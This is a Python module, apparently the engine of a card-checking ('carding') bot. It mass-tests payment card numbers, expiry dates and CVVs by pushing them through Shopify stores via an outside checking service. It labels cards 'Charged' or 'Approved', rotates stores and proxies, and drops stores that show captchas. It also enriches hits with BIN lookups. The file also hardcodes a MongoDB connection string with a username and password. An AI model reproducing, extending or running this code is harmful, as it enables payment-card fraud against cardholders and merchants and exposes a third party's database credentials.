import asyncio
import aiohttp
import time
import json
import random
import string
import os
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
from pymongo import MongoClient
from collections import defaultdict
import re

# MongoDB Setup
MONGO_URI = "mongodb+srv://ElectraOp:BGMI272@cluster0.1jmwb.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
DB_NAME = "fn_bot"
client = MongoClient(MONGO_URI)
db = client[DB_NAME]
user_sites_col = db["user_sites"]
mass_checks_col = db["mass_checks"]
sites_txt_col = db["sites_txt"]

@dataclass
class Gate4Result:
    status: str
    response: str
    price: str
    gateway: str
    card: str
    card_info: str = ""
    issuer: str = ""
    country: str = ""
    flag: str = ""
    currency: str = ""
    elapsed_time: float = 0.0
    proxy_status: str = ""
    site_used: str = ""
    message: str = ""
    bank: str = ""
    brand: str = ""
    type: str = ""
    level: str = ""
    should_retry: bool = False  # New field to indicate if we should retry with new site

class Gate4Manager:
    def __init__(self):
        self.session = None
        self.user_locks = defaultdict(asyncio.Lock)
        self.user_check_data = {}
        self.bad_sites = set()
        self.captcha_sites = {}
        self.sites_cache = []
        self.global_sites = []
        self.last_site_load = 0
        self.site_load_interval = 300
        self.load_global_sites()
        
    async def get_session(self):
        if self.session is None or self.session.closed:
            timeout = aiohttp.ClientTimeout(total=30)
            self.session = aiohttp.ClientSession(timeout=timeout)
        return self.session
    
    async def close_session(self):
        if self.session and not self.session.closed:
            await self.session.close()
    
    def load_global_sites(self):
        """Load sites from sites.txt file"""
        try:
            if os.path.exists("sites.txt"):
                with open("sites.txt", "r", encoding='utf-8') as f:
                    sites = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                    self.global_sites = sites
                    self.sites_cache = [site for site in sites if site not in self.bad_sites]
                    self.last_site_load = time.time()
            else:
                with open("sites.txt", "w") as f:
                    f.write("# Add your Shopify sites here\n")
                    f.write("https://scorenn.com\n")
                self.global_sites = ["https://scorenn.com"]
                self.sites_cache = ["https://scorenn.com"]
        except Exception as e:
            print(f"Error loading global sites: {e}")
            self.global_sites = ["https://scorenn.com"]
            self.sites_cache = ["https://scorenn.com"]
    
    def reload_sites_cache(self):
        """Reload sites cache excluding bad sites and sites with recent captcha"""
        current_time = time.time()
        sites_to_remove = []
        for site, captcha_time in self.captcha_sites.items():
            if current_time - captcha_time > 86400:
                sites_to_remove.append(site)
        
        for site in sites_to_remove:
            del self.captcha_sites[site]
        
        self.sites_cache = [
            site for site in self.global_sites 
            if site not in self.bad_sites and site not in self.captcha_sites
        ]
        self.last_site_load = time.time()
    
    async def get_site_for_user(self, user_id: int) -> str:
        """Get site for user - first check user's personal sites, then regular sites, then global"""
        # First, try user's personal sites
        personal_sites = list(user_sites_col.find({
            "user_id": user_id, 
            "active": True,
            "personal": True
        }))
        
        if personal_sites:
            personal_sites_list = [site["site"] for site in personal_sites]
            personal_sites_list = [
                site for site in personal_sites_list 
                if site not in self.bad_sites and site not in self.captcha_sites
            ]
            if personal_sites_list:
                return random.choice(personal_sites_list)
        
        # Then try user's regular sites
        user_sites = list(user_sites_col.find({
            "user_id": user_id, 
            "active": True,
            "personal": {"$ne": True}  # Not personal sites
        }))
        
        user_sites_list = [site["site"] for site in user_sites]
        if user_sites_list:
            user_sites_list = [
                site for site in user_sites_list 
                if site not in self.bad_sites and site not in self.captcha_sites
            ]
            if user_sites_list:
                return random.choice(user_sites_list)
        
        # Finally, use global sites
        current_time = time.time()
        if not self.sites_cache or (current_time - self.last_site_load) > self.site_load_interval:
            self.reload_sites_cache()
        
        if self.sites_cache:
            return random.choice(self.sites_cache)
        
        return "https://scorenn.com"
    
    def is_valid_response(self, response: str) -> bool:
        """Check if the response is a valid Shopify response"""
        response_upper = response.upper()
        
        # Valid responses that indicate the site is working properly
        valid_responses = [
            "CARD_DECLINED",
            "ActionRequired",
            "ACTION REQUIRED",
            "Thank You",
            "Thank",
            "thank",
            "thank you",
            "3D_AUTHENTICATION"
        ]
        
        # Check if any valid response pattern is in the response
        for valid_resp in valid_responses:
            if valid_resp in response_upper:
                return True
        
        return False
    
    async def check_site(self, site: str) -> Tuple[bool, str]:
        """Check if a site works with the API"""
        try:
            test_card = "4242424242424242|01|29|123"
            result = await self.check_card(test_card, site, test_mode=True)
            
            # Check if we got a valid API response
            if result.status == "Error" or result.should_retry:
                return False, result.message
            
            # Check if response is valid
            if self.is_valid_response(result.response):
                return True, f"Site working - Response: {result.response}"
            else:
                # If we get "Product id is empty" or other errors, site is not working
                if "PRODUCT ID IS EMPTY" in result.response.upper():
                    self.mark_site_bad(site)
                    return False, "Product ID is empty - Site removed"
                
                # Mark as captcha if detected
                if "HCAPTCHA" in result.response.upper() or "CAPTCHA" in result.response.upper():
                    self.captcha_sites[site] = time.time()
                    return False, "Captcha detected"
                
                # Any other response means site is not working
                self.mark_site_bad(site)
                return False, f"Invalid response: {result.response}"
                
        except Exception as e:
            return False, str(e)
    
    async def perform_bin_lookup(self, cc: str, proxy: str = None) -> Dict[str, Any]:
        """Perform BIN lookup for card details"""
        start_time = time.time()
        
        try:
            # Extract first 6 digits (BIN)
            cc_clean = cc.replace(" ", "").split('|')[0]
            if len(cc_clean) < 6:
                return {"success": False, "message": "Invalid card number", "elapsed_time": time.time() - start_time}
            
            bin_num = cc_clean[:6]
            url = f'https://bins.antipublic.cc/bins/{bin_num}'
            
            # Prepare headers
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'application/json',
                'Accept-Language': 'en-US,en;q=0.9',
                'Referer': 'https://bins.antipublic.cc/',
                'Origin': 'https://bins.antipublic.cc'
            }
            
            # Try without proxy first
            try:
                async with aiohttp.ClientSession(headers=headers) as session:
                    async with session.get(url, timeout=10) as response:
                        if response.status == 200:
                            data = await response.json()
                            return self._process_bin_data(data, start_time)
                        else:
                            print(f"Direct BIN lookup failed with status: {response.status}")
            except Exception as e:
                print(f"Direct BIN lookup error: {str(e)}")
            
            # Try with HTTP proxy if provided
            if proxy:
                try:
                    # Clean proxy string
                    proxy_url = proxy
                    if not proxy_url.startswith(('http://', 'https://')):
                        proxy_url = f"http://{proxy_url}"
                    
                    print(f"Trying BIN lookup with proxy: {proxy_url}")
                    
                    async with aiohttp.ClientSession(headers=headers) as session:
                        async with session.get(url, proxy=proxy_url, timeout=10) as response:
                            if response.status == 200:
                                data = await response.json()
                                return self._process_bin_data(data, start_time)
                            else:
                                print(f"Proxy BIN lookup failed with status: {response.status}")
                except Exception as e:
                    print(f"Proxy BIN lookup error: {str(e)}")
            
            return {"success": False, "message": "BIN Lookup failed", "elapsed_time": time.time() - start_time}
                    
        except Exception as e:
            print(f"BIN lookup exception: {str(e)}")
            return {"success": False, "message": f"BIN Lookup error: {str(e)}", "elapsed_time": time.time() - start_time}
    
    def _process_bin_data(self, data: Dict, start_time: float) -> Dict[str, Any]:
        """Process BIN data response based on the actual API response format"""
        # Debug: Print the raw data for troubleshooting
        print(f"BIN API Response: {data}")
        
        # Get country currencies safely
        currencies = data.get('country_currencies', ['USD'])
        if isinstance(currencies, list) and currencies:
            currency = currencies[0]
        else:
            currency = "USD"
        
        return {
            "success": True,
            "bin": data.get('bin', ''),
            "bank": data.get('bank', 'Unknown'),
            "brand": data.get('brand', 'Unknown'),
            "type": data.get('type', 'Unknown'),
            "level": data.get('level', 'Unknown'),
            "country": data.get('country_name', 'Unknown'),
            "flag": data.get('country_flag', '🏳️'),
            "currency": currency,
            "elapsed_time": time.time() - start_time
        }
    
    def format_proxy_display(self, proxy: str) -> str:
        """Format proxy for display (hide sensitive info)"""
        if not proxy or proxy == "No Proxy":
            return "No Proxy"
        
        try:
            if '://' in proxy:
                proxy = proxy.split('://')[-1]
            
            if '@' in proxy:
                auth, server = proxy.split('@', 1)
                if ':' in server:
                    host, port = server.split(':', 1)
                    if len(host) > 6:
                        host_display = f"{host[:3]}...{host[-3:]}"
                    else:
                        host_display = "***"
                    return f"***@{host_display}:{port}"
                else:
                    return "***@***"
            else:
                if ':' in proxy:
                    host, port = proxy.split(':', 1)
                    if len(host) > 6:
                        host_display = f"{host[:3]}...{host[-3:]}"
                    else:
                        host_display = "***"
                    return f"{host_display}:{port}"
                else:
                    return "***"
        except:
            return "Proxy"
    
    def format_site_display(self, site: str) -> str:
        """Format site for display (hide long URLs)"""
        if not site:
            return "Unknown"
        
        try:
            if site.startswith('http://'):
                site = site[7:]
            elif site.startswith('https://'):
                site = site[8:]
            
            if site.startswith('www.'):
                site = site[4:]
            
            domain = site.split('/')[0]
            
            if len(domain) > 20:
                return f"{domain[:17]}..."
            return domain
        except:
            return "Site"
    
    async def check_card(self, card: str, site: str = None, proxy: str = None, test_mode: bool = False) -> Gate4Result:
        """Check a single card using the API"""
        start_time = time.time()
        
        try:
            if not site:
                site = "https://scorenn.com"
            
            card = card.strip()
            
            # Prepare the API URL
            if proxy:
                # Clean proxy for the API call
                clean_proxy = proxy
                if clean_proxy.startswith('http://'):
                    clean_proxy = clean_proxy.replace('http://', '')
                elif clean_proxy.startswith('https://'):
                    clean_proxy = clean_proxy.replace('https://', '')
                
                api_url = f"https://notconfirm.com/index.php?site={site}&cc={card}&proxy={clean_proxy}"
            else:
                api_url = f"https://notconfirm.com/index.php?site={site}&cc={card}"
            
            print(f"Checking card with URL: {api_url}")
            
            session = await self.get_session()
            async with session.get(api_url, timeout=30) as response:
                response_text = await response.text()
                print(f"API Response status: {response.status}, text: {response_text[:200]}")
                
                if response.status != 200:
                    return Gate4Result(
                        status="Error",
                        response="API Error",
                        price="0.00",
                        gateway="Unknown",
                        card=card,
                        elapsed_time=time.time() - start_time,
                        proxy_status=self.format_proxy_display(proxy) if proxy else "No Proxy",
                        site_used=site,
                        message=f"API returned status {response.status}",
                        should_retry=True
                    )
                
                try:
                    data = json.loads(response_text)
                    response_msg = data.get("Response", "")
                    status_msg = str(data.get("Status", "")).lower()
                    
                    # Check for "Product id is empty" error
                    response_upper = response_msg.upper()
                    if "PRODUCT ID IS EMPTY" in response_upper:
                        if not test_mode:
                            self.mark_site_bad(site)
                        return Gate4Result(
                            status="Error",
                            response="Product ID is empty",
                            price="0.00",
                            gateway="Unknown",
                            card=card,
                            elapsed_time=time.time() - start_time,
                            proxy_status=self.format_proxy_display(proxy) if proxy else "No Proxy",
                            site_used=site,
                            message="Site removed due to 'Product id is empty'",
                            should_retry=True
                        )
                    
                    # Check for captcha
                    if "HCAPTCHA" in response_upper or "CAPTCHA" in response_upper:
                        self.captcha_sites[site] = time.time()
                        return Gate4Result(
                            status="Captcha",
                            response=response_msg,
                            price=data.get("Price", "0.00"),
                            gateway=data.get("Gateway", "Unknown"),
                            card=card,
                            elapsed_time=time.time() - start_time,
                            proxy_status=self.format_proxy_display(proxy) if proxy else "No Proxy",
                            site_used=site,
                            message="HCAPTCHA DETECTED",
                            should_retry=True
                        )
                    
                    # Check if response is valid
                    if not self.is_valid_response(response_msg):
                        if not test_mode:
                            self.mark_site_bad(site)
                        return Gate4Result(
                            status="Error",
                            response=response_msg,
                            price=data.get("Price", "0.00"),
                            gateway=data.get("Gateway", "Unknown"),
                            card=card,
                            elapsed_time=time.time() - start_time,
                            proxy_status=self.format_proxy_display(proxy) if proxy else "No Proxy",
                            site_used=site,
                            message=f"Invalid response format: {response_msg}",
                            should_retry=True
                        )
                    
                    # Determine status based on response
                    response_upper = response_msg.upper()
                    
                    if any(keyword in response_upper for keyword in ["Thank", "Thank You", "thank"]):
                        status = "Charged"
                    elif "ActionRequired" in response_upper or "3D_AUTHENTICATION" in response_upper:
                        status = "Approved"
                    elif "APPROVED" in response_upper:
                        status = "Approved"
                    elif "CARD_DECLINED" in response_upper or "DECLINED" in response_upper:
                        status = "Declined"
                    elif status_msg == "true":
                        status = "Approved"
                    else:
                        status = "Declined"
                    
                    # Parse card info
                    card_parts = card.split('|')
                    if len(card_parts) >= 4:
                        card_num = card_parts[0].strip()
                        if len(card_num) >= 16:
                            card_info = f"{card_num[:6]}******{card_num[-4:]} | {card_parts[1].strip()}/{card_parts[2].strip()}"
                        else:
                            card_info = card
                    else:
                        card_info = card
                    
                    # Create result
                    result = Gate4Result(
                        status=status,
                        response=response_msg,
                        price=data.get("Price", "0.00"),
                        gateway=data.get("Gateway", "Unknown"),
                        card=card,
                        card_info=card_info,
                        issuer="",
                        country="Unknown",
                        flag="🏳️",
                        currency="USD",
                        elapsed_time=time.time() - start_time,
                        proxy_status=self.format_proxy_display(proxy) if proxy else "No Proxy",
                        site_used=site,
                        message=response_msg,
                        bank="Unknown",
                        brand="Unknown",
                        type="Unknown",
                        level="Unknown",
                        should_retry=False
                    )
                    
                    # Perform BIN lookup if not in test mode
                    if not test_mode:
                        print(f"Performing BIN lookup for card: {card}")
                        bin_data = await self.perform_bin_lookup(card, proxy)
                        print(f"BIN lookup result: {bin_data}")
                        
                        if bin_data.get("success"):
                            result.bank = bin_data.get("bank", "Unknown")
                            result.brand = bin_data.get("brand", "Unknown")
                            result.type = bin_data.get("type", "Unknown")
                            result.level = bin_data.get("level", "Unknown")
                            result.country = bin_data.get("country", "Unknown")
                            result.flag = bin_data.get("flag", "🏳️")
                            result.currency = bin_data.get("currency", "USD")
                    
                    return result
                        
                except json.JSONDecodeError:
                    # Handle non-JSON response
                    response_upper = response_text.upper()
                    
                    # Check for "Product id is empty" in raw response
                    if "PRODUCT ID IS EMPTY" in response_upper:
                        if not test_mode:
                            self.mark_site_bad(site)
                        return Gate4Result(
                            status="Error",
                            response="Product ID is empty",
                            price="0.00",
                            gateway="Unknown",
                            card=card,
                            elapsed_time=time.time() - start_time,
                            proxy_status=self.format_proxy_display(proxy) if proxy else "No Proxy",
                            site_used=site,
                            message="Site removed due to 'Product id is empty'",
                            should_retry=True
                        )
                    
                    if "HCAPTCHA" in response_upper or "CAPTCHA" in response_upper:
                        self.captcha_sites[site] = time.time()
                        return Gate4Result(
                            status="Captcha",
                            response="HCAPTCHA DETECTED",
                            price="0.00",
                            gateway="Unknown",
                            card=card,
                            elapsed_time=time.time() - start_time,
                            proxy_status=self.format_proxy_display(proxy) if proxy else "No Proxy",
                            site_used=site,
                            message="HCAPTCHA DETECTED",
                            should_retry=True
                        )
                    
                    # Check if raw text contains valid response
                    if not self.is_valid_response(response_text):
                        if not test_mode:
                            self.mark_site_bad(site)
                        return Gate4Result(
                            status="Error",
                            response=response_text[:100],
                            price="0.00",
                            gateway="Unknown",
                            card=card,
                            elapsed_time=time.time() - start_time,
                            proxy_status=self.format_proxy_display(proxy) if proxy else "No Proxy",
                            site_used=site,
                            message=f"Invalid raw response: {response_text[:100]}",
                            should_retry=True
                        )
                    
                    # Try to determine status from raw text
                    if any(keyword in response_upper for keyword in ["Thank", "Thank You", "thank", "thank you"]):
                        status = "Charged"
                    elif any(keyword in response_upper for keyword in ["ActionRequired", "3D_AUTHENTICATION"]):
                        status = "Approved"
                    elif "DECLINED" in response_upper:
                        status = "Declined"
                    elif "CARD_DECLINED" in response_upper:
                        status = "Declined"
                    else:
                        status = "Declined"
                    
                    return Gate4Result(
                        status=status,
                        response=response_text[:100],
                        price="0.00",
                        gateway="Unknown",
                        card=card,
                        elapsed_time=time.time() - start_time,
                        proxy_status=self.format_proxy_display(proxy) if proxy else "No Proxy",
                        site_used=site,
                        message=f"Raw response: {response_text[:100]}",
                        should_retry=False
                    )
                    
        except asyncio.TimeoutError:
            return Gate4Result(
                status="Error",
                response="Timeout",
                price="0.00",
                gateway="Unknown",
                card=card,
                elapsed_time=time.time() - start_time,
                proxy_status=self.format_proxy_display(proxy) if proxy else "No Proxy",
                site_used=site,
                message="Request timeout",
                should_retry=True
            )
        except Exception as e:
            print(f"Check card exception: {str(e)}")
            return Gate4Result(
                status="Error",
                response="Exception",
                price="0.00",
                gateway="Unknown",
                card=card,
                elapsed_time=time.time() - start_time,
                proxy_status=self.format_proxy_display(proxy) if proxy else "No Proxy",
                site_used=site,
                message=str(e),
                should_retry=True
            )
    
    def mark_site_bad(self, site: str):
        """Mark a site as bad (not working)"""
        self.bad_sites.add(site)
        
        # Update in database - mark as inactive
        user_sites_col.update_many(
            {"site": site},
            {"$set": {"active": False, "marked_bad_at": datetime.utcnow()}}
        )
        
        # Also remove from cache
        if site in self.sites_cache:
            self.sites_cache.remove(site)
    
    def add_user_check(self, user_id: int, total_cards: int):
        """Add a new mass check for user"""
        check_id = f"{user_id}_{int(time.time())}"
        self.user_check_data[user_id] = {
            "check_id": check_id,
            "start_time": time.time(),
            "total": total_cards,
            "checked": 0,
            "charged": 0,
            "approved": 0,
            "declined": 0,
            "errors": 0,
            "hits": [],
            "declined_list": [],
            "current_response": "Waiting...",
            "stop": False,
            "last_update": time.time()
        }
        return check_id
    
    def update_user_check(self, user_id: int, result: Gate4Result):
        """Update user check stats"""
        if user_id not in self.user_check_data:
            return
        
        data = self.user_check_data[user_id]
        data["checked"] += 1
        data["last_update"] = time.time()
        data["current_response"] = result.response[:30] + "..." if len(result.response) > 30 else result.response
        
        if result.status == "Charged":
            data["charged"] += 1
            data["hits"].append((result.card, "Charged", result.response))
        elif result.status == "Approved":
            data["approved"] += 1
            data["hits"].append((result.card, "Approved", result.response))
        elif result.status == "Declined":
            data["declined"] += 1
            data["declined_list"].append(result.card)
        elif result.status == "Error" or result.status == "Captcha":
            data["errors"] += 1
    
    def stop_user_check(self, user_id: int) -> bool:
        """Stop a user's mass check"""
        if user_id in self.user_check_data:
            self.user_check_data[user_id]["stop"] = True
            return True
        return False
    
    def get_user_check_data(self, user_id: int):
        """Get user's current check data"""
        return self.user_check_data.get(user_id)
    
    def remove_user_check(self, user_id: int):
        """Remove user check data"""
        if user_id in self.user_check_data:
            del self.user_check_data[user_id]
    
    def add_mass_sites(self, sites: List[str]):
        """Add multiple sites to global list"""
        try:
            existing_sites = set()
            if os.path.exists("sites.txt"):
                with open("sites.txt", "r", encoding='utf-8') as f:
                    existing_sites = set(line.strip() for line in f if line.strip() and not line.startswith('#'))
            
            added_count = 0
            with open("sites.txt", "a", encoding='utf-8') as f:
                for site in sites:
                    site = site.strip()
                    if site and site not in existing_sites:
                        f.write(f"{site}\n")
                        existing_sites.add(site)
                        added_count += 1
            
            self.load_global_sites()
            return added_count, len(existing_sites)
            
        except Exception as e:
            print(f"Error adding mass sites: {e}")
            return 0, 0
    
    async def test_bin_lookup(self, bin_number: str):
        """Test BIN lookup directly"""
        test_card = f"{bin_number}0000000000|01|29|123"
        result = await self.perform_bin_lookup(test_card)
        print(f"Test BIN Lookup for {bin_number}: {result}")
        return result

# Global gate4 manager
gate4_manager = Gate4Manager()
